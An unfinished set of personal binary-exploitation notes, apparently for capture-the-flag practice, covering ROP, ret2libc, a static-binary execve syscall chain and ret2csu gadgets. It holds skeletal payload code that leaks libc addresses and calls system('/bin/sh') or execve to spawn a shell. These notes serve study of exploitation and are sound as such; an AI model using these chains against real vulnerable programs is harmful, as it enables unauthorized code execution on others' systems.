
### in progress


```
ROP
	what is ROP
	how to find Gadgets (ropper)
	how to find Strings in an ELF	
	how to pivote the Stack

```
ret2libc (dynamically linked ELF)

		to use ret2libc we need to know two things
	
		1. the exact libc version the ELF uses
		2. the base addr of libc in the process
		

		to find the exact version of libc we can leak some GOT entrys which stores pointers to the functions in libc. 
		(we also need this for finding the base of libc in the process)

		since we have the ELF file we can do this with ease as the GOT and PLT sections are known to us (asuming PIE is off)

		```	
		payload = b''
		payload += b'A'*0x10			#padding
		payload += p64(pop_rdi)			#set first arg to the addr of puts@GOT
		payload += p64(puts@GOT)		#addr puts@GOT
		payload += p64(puts@PLT)		#call puts@PLT(puts@GOT)
		```

		this payload will print the libc addr of puts() in the current process.

		puts_leak = `leaked addr here`

		ok now ne know the exact addr of puts() in libc but we still dont know which libc version is used.

		we will use a libc database like https://libc.blukat.me/ to find the exact version
		libc.blucat will find the libc based of the last 3 nibbles of the leaked addr siche these will always be the same 

		`last 3 nibbles of leaked addr here` 

		### BILD VON LIBC.BLUCAT.ME einfuegen ###
		
		usually you need to leak more than one libc function addr or the addr of a known string such as "/bin/sh" to find the exact libc version.

		ok we now know the exact libc version now we can download the libc and calculate the offset from puts() to the base addr of libc in the process
		use `vmmap` to find the libc base

		```
		vmmap output here
		```
		
		know_libc_base = `libc base here`		

		offset = puts_leak - known_libc_base 		known_libc_base as it will change next time the ELF file is run (ASLR)
		libc_base = puts_leak - offset

		ok we now know the libc version and the exact libc_base inside the current process.
		now we can use libc functions such as system("/bin/sh") we can setup the args and than simply call it from libc

		1. setup the argument for system(pointer_binsh) 
		2. call the libc function system()

		payload = b''
		payload += b'A'*0x10			#padding
		payload += p64(pop_rdi)			#set first arg to /bin/sh pointer
		payload += p64(pointer_binsh)		#addr of /bin/sh\x00 in mem
		payload += p64(system)			#call the libc system function

```



```
ret2system (statically linked ELF)
		
		`syscall(rax,rdi,rsi,rdx)`	
		we want to call `execve(pointer_binsh,0,0)` to spawn a shell

		so we need to setup a `syscall(execve(pointer_binsh,0,0))`
		
		1. find the syscall number for execve
		2. find a gadget that can write to a pointer like `mov [rdi],rdx`
		3. write b'/bin/sh\x00' to a writable addr.
		4. setup the registers and than syscall

		check this to find syscall numbers `https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit`
		
		we know the syscall number is 0x3b so we want to call `syscall(0x3b,pointer_binsh,0,0)`

		we need a gadget that can write to a pointer so we can store the `/bin/sh\x00` string somewhere
		we can find such a gadget by using `ropper`

		```
		ropper /1/ mov [r??],r??
		```		

		i choose `mov [rdi],rdx` ... somethink like `mov [rax],rdx` would worked too.
		since we have to set rdi = pointer_binsh and `mov [rdi],rdx` directly writes to rdi we saved some gadgets.
		when using `mov [rax],rdx` we have to `mov rdi,rax` afterwards.



		payload = b''
		payload += b'A'*0x10			#padding

		payload += p64(pop_rax)			#set rax to 0x3b
		payload += p64(0x3b)

		payload += p64(pop_rdi)			#set rdi to a .bss addr .bss is usually `rw-`
		payload += p64(.bss)			#addr where we want to write to

		payload += p64(pop_rdx)			#set rdx to `/bin/sh\x00`
		payload += b`/bin/sh\x00`		#be carefull when you set this allways keep the 0x8 byte pad in mind e.g. when you want to call execve with `/bin/cat\x00`
		
		payload += p64(write_gadget)		#writes the content of rdx = `/bin/sh\x00` into the addr rdi = `.bss` points to
		
		payload += p64(pop_rsi)			#set rsi to 0
		payload += p64(0x00)

		payload += p64(pop_rdx)			#set rdx to 0
		payload += p64(0x00)

		payload += p64(syscall)				

```

```
ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found)
		
		the `__libc_csu_init` function is responsible to initialize libc files.
		in this function there are some interesting gadgets we can use.

		first gadget let us controll some registers with pop
		```
     		__libc_csu_init+90	POP        RBX
        	__libc_csu_init+91	POP        RBP
        	__libc_csu_init+92	POP        R12
        	__libc_csu_init+94 	POP        R13
        	__libc_csu_init+96	POP        R14
	        __libc_csu_init+98 	POP        R15
        	__libc_csu_init+100 	RET
		```

		and this will let us controll rdx,rsi and edi but we need to meet some conditions 
		```
                            	 
        	__libc_csu_init+64	MOV        RDX,R14
        	__libc_csu_init+67 	MOV        RSI,R13
        	__libc_csu_init+70 	MOV        EDI,R12D
        	__libc_csu_init+73	CALL       qword ptr [R15 + RBX*0x8]
        	__libc_csu_init+77	ADD        RBX,0x1
        	__libc_csu_init+81	CMP        RBP,RBX
        	__libc_csu_init+84	JNE        __libc_csu_init+64
        	__libc_csu_init+86	ADD        RSP,0x8
        	__libc_csu_init+90	POP        RBX
        	__libc_csu_init+91	POP        RBP
        	__libc_csu_init+92	POP        R12
        	__libc_csu_init+94 	POP        R13
        	__libc_csu_init+96	POP        R14
	        __libc_csu_init+98 	POP        R15
        	__libc_csu_init+100 	RET
		```

		rbx,rbp,r12,r13,r14,r15

		rdx = r14
		rsi = r13
		edi = r12D
		rip = [r15 + rbx*8] #we use this to syscall

		<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2csu_gadgets.png">



```
	ret2dl_resolve

SROP

BROP


```

# BROP 

# SROP
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/sigret_frame.png">
